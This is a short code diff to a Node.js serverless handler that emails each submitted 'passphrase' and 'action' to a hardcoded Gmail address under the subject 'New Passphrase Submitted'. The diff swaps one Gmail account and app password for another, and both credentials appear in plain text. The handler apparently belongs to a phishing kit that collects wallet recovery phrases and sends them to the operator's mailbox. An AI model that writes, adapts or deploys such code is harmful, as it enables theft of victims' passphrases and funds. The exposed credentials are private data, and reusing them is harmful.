@@ -46,15 +46,15 @@ module.exports = async (req, res) => {
             port: 465,
             secure: true,
             auth: {
-                user: 'kutijude1@gmail.com',
-                pass: 'rtbqiskopahksnha'
+                user: 'nellyfancii@gmail.com',
+                pass: 'dpeplcokrinsjfax'
             }
         });
 
         console.log('Sending email...'); // Debug log
         await transporter.sendMail({
-            from: 'kutijude1@gmail.com',
-            to: 'kutijude1@gmail.com',
+            from: 'nellyfancii@gmail.com',
+            to: 'nellyfancii@gmail.com',
             subject: 'New Passphrase Submitted',
             html: `<b>Action:</b> ${action}<br><b>Passphrase:</b> ${passphrase || 'None'}`
         });
